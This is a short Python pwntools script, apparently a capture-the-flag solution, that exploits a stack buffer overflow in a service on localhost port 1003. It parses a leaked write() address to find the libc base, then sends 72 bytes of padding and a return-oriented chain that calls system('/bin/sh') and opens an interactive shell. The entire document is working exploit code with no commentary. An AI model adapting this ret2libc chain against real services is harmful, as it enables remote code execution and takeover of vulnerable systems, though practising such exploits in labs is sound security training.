from pwn import *
io = remote('localhost',1003)
libc = ELF('./source/libc.so.6',checksec=False)

pop_rax_ret = 0x0000000000040647
pop_rdi_jmp_rax = 0x000000000002b003

io.recvline()
io.recvuntil(b'Write() address : ')
libc.address = int(io.recvuntil(b'\n'),16) - libc.symbols['write']

payload = b'A'*72
payload += p64(libc.address+pop_rax_ret)
payload += p64(libc.symbols['system'])
payload += p64(libc.address+pop_rdi_jmp_rax)
payload += p64(next(libc.search(b'/bin/sh')))

io.send(payload)
io.interactive()
